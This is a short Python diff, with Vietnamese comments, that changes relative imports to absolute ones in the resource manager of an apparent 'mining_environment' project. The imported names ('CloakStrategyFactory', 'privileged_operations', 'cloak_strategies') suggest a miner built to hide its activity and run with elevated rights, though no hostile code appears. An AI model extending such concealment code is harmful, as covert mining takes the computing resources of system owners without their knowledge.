@@ -20,17 +20,17 @@ from typing import List, Any, Dict, Optional
 from itertools import count
 
 # Các import liên quan đến dự án
-from .utils import MiningProcess
-from .resource_control import ResourceControlFactory, CloakStrategyFactory
-from .auxiliary_modules.interfaces import IResourceManager
-from .auxiliary_modules.models import ConfigModel
+from mining_environment.scripts.utils import MiningProcess
+from mining_environment.scripts.resource_control import ResourceControlFactory, CloakStrategyFactory
+from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
+from mining_environment.scripts.auxiliary_modules.models import ConfigModel
 # 🗑️ EventBus import removed - using DirectPIDRegistry instead
-from .privileged_operations import get_privileged_manager
-from .unified_logging import get_unified_logger
-from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
+from mining_environment.scripts.privileged_operations import get_privileged_manager
+from mining_environment.scripts.unified_logging import get_unified_logger
+from mining_environment.scripts.error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
 # ✅ INTELLIGENT CACHING: Use advanced strategy cache system
-from .strategy_cache import get_strategy_cache, CacheEvictionPolicy
+from mining_environment.scripts.strategy_cache import get_strategy_cache, CacheEvictionPolicy
 
 class SharedResourceManager:
     """
@@ -1180,7 +1180,7 @@ class ResourceManager(IResourceManager):
             
             # --- NEW: Force-create detailed log files for core modules ---
             try:
-                from .unified_logging import get_unified_logger
+                from mining_environment.scripts.unified_logging import get_unified_logger
                 for core_logger_name in [
                     'mining_environment.cloak_strategies',
                     'mining_environment.resource_control']:
